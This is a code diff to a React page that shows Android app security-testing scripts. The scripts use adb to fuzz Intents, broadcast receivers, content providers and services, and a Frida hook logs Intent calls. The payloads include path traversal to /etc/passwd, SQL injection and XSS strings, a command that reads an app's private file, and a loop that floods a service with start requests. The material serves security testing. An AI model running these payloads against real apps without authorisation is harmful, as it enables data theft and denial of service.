@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
@@ -256,22 +255,26 @@ echo "Intent fuzzing completed"`)}
 PACKAGE_NAME="com.example.target"
 ACTIVITY_NAME="com.example.target.MainActivity"
 
-echo "Starting Intent fuzzing for \\$PACKAGE_NAME"
+echo "Starting Intent fuzzing for $PACKAGE_NAME"
 
 # Test 1: Basic Intent with malicious extras
-adb shell am start -n "\\$PACKAGE_NAME/\\$ACTIVITY_NAME" \\\\
-  --es "username" "../../../etc/passwd" \\\\
-  --es "password" "' OR 1=1--" \\\\
+adb shell am start -n "$PACKAGE_NAME/$ACTIVITY_NAME" \\
+  --es "username" "../../../etc/passwd" \\
+  --es "password" "' OR 1=1--" \\
   --es "url" "javascript:alert('XSS')"
 
 # Test 2: Intent with malicious URI
-adb shell am start -a android.intent.action.VIEW \\\\
+adb shell am start -a android.intent.action.VIEW \\
   -d "content://com.example.provider/../../sensitive_data"
 
 # Test 3: Intent with oversized data
-LARGE_STRING=\\$(python3 -c "print('A' * 10000)")
-adb shell am start -n "\\$PACKAGE_NAME/\\$ACTIVITY_NAME" \\\\
-  --es "data" "\\$LARGE_STRING"
+LARGE_STRING=$(python3 -c "print('A' * 10000)")
+adb shell am start -n "$PACKAGE_NAME/$ACTIVITY_NAME" \\
+  --es "data" "$LARGE_STRING"
+
+# Test 4: Intent with special characters
+adb shell am start -n "$PACKAGE_NAME/$ACTIVITY_NAME" \\
+  --es "input" "\\x00\\x01\\x02\\xFF"
 
 echo "Intent fuzzing completed"`}
                     </pre>
@@ -311,6 +314,7 @@ Java.perform(function() {
 {`// Intent monitoring Frida script
 Java.perform(function() {
     var Intent = Java.use("android.content.Intent");
+    var Bundle = Java.use("android.os.Bundle");
     
     Intent.putExtra.overload('java.lang.String', 'java.lang.String').implementation = function(key, value) {
         console.log("[Intent] putExtra: " + key + " = " + value);
@@ -320,6 +324,11 @@ Java.perform(function() {
     Intent.setAction.implementation = function(action) {
         console.log("[Intent] setAction: " + action);
         return this.setAction(action);
+    };
+    
+    Intent.setData.implementation = function(data) {
+        console.log("[Intent] setData: " + data);
+        return this.setData(data);
     };
 });`}
                     </pre>
@@ -423,19 +432,32 @@ adb shell content query --uri "content://$PACKAGE_NAME.provider/files/../../../d
 
 PACKAGE_NAME="com.example.target"
 
-echo "Enumerating Content Providers for \\$PACKAGE_NAME"
+echo "Enumerating Content Providers for $PACKAGE_NAME"
+
+# Extract and analyze AndroidManifest.xml
+aapt dump xmltree app.apk AndroidManifest.xml | grep -A 10 -B 2 "provider"
 
 # Test common Content Provider URIs
 COMMON_URIS=(
-    "content://\\$PACKAGE_NAME.provider/"
-    "content://\\$PACKAGE_NAME.provider/users"
-    "content://\\$PACKAGE_NAME.provider/files"
+    "content://$PACKAGE_NAME.provider/"
+    "content://$PACKAGE_NAME.provider/users"
+    "content://$PACKAGE_NAME.provider/files"
+    "content://$PACKAGE_NAME.provider/settings"
 )
 
-for uri in "\\${COMMON_URIS[@]}"; do
-    echo "Testing URI: \\$uri"
-    adb shell content query --uri "\\$uri"
-done`}
+for uri in "\${COMMON_URIS[@]}"; do
+    echo "Testing URI: $uri"
+    adb shell content query --uri "$uri" 2>/dev/null || echo "URI not accessible"
+done
+
+# SQL Injection tests
+echo "Testing SQL injection vulnerabilities..."
+adb shell content query --uri "content://$PACKAGE_NAME.provider/users" \\
+    --where "id=1' OR '1'='1"
+
+# Path traversal tests
+echo "Testing path traversal vulnerabilities..."
+adb shell content query --uri "content://$PACKAGE_NAME.provider/files/../../../data"`}
                     </pre>
                   </div>
                 </div>
@@ -541,22 +563,30 @@ done`)}
 
 PACKAGE_NAME="com.example.target"
 
+# Extract all broadcast receivers
+echo "Extracting broadcast receivers from $PACKAGE_NAME"
+aapt dump xmltree app.apk AndroidManifest.xml | grep -A 20 "receiver" > receivers.txt
+
 # Fuzz broadcast receivers with various payloads
 PAYLOADS=(
     "javascript:alert('XSS')"
     "../../../etc/passwd"
     "' OR 1=1--"
+    "\\x00\\x01\\x02"
+    $(python3 -c "print('A' * 1000)")
 )
 
 ACTIONS=(
     "android.intent.action.BOOT_COMPLETED"
+    "android.intent.action.USER_PRESENT"
     "com.app.CUSTOM_ACTION"
 )
 
-for action in "\\${ACTIONS[@]}"; do
-    for payload in "\\${PAYLOADS[@]}"; do
-        echo "Testing: \\$action with \\$payload"
-        adb shell am broadcast -a "\\$action" --es "data" "\\$payload"
+for action in "\${ACTIONS[@]}"; do
+    for payload in "\${PAYLOADS[@]}"; do
+        echo "Testing action: $action with payload: $payload"
+        adb shell am broadcast -a "$action" --es "data" "$payload"
+        sleep 1
     done
 done`}
                     </pre>
@@ -601,14 +631,22 @@ echo "Service exploitation tests completed"`)}
 
 PACKAGE_NAME="com.example.target"
 
-echo "Analyzing services for \\$PACKAGE_NAME"
+echo "Analyzing services for $PACKAGE_NAME"
+
+# List all services
+adb shell dumpsys activity services | grep "$PACKAGE_NAME"
 
 # Test service binding
-adb shell am startservice -n "\\$PACKAGE_NAME/.VulnerableService" \\\\
-    --es "command" "cat /data/data/\\$PACKAGE_NAME/sensitive.txt"
+adb shell am startservice -n "$PACKAGE_NAME/.VulnerableService" \\
+    --es "command" "cat /data/data/$PACKAGE_NAME/sensitive.txt"
 
 # AIDL interface testing
-adb shell service call "\\$PACKAGE_NAME" 1 s16 "malicious_input"
+adb shell service call "$PACKAGE_NAME" 1 s16 "malicious_input"
+
+# Service DoS testing
+for i in {1..100}; do
+    adb shell am startservice -n "$PACKAGE_NAME/.TestService" &
+done
 
 echo "Service exploitation tests completed"`}
                     </pre>
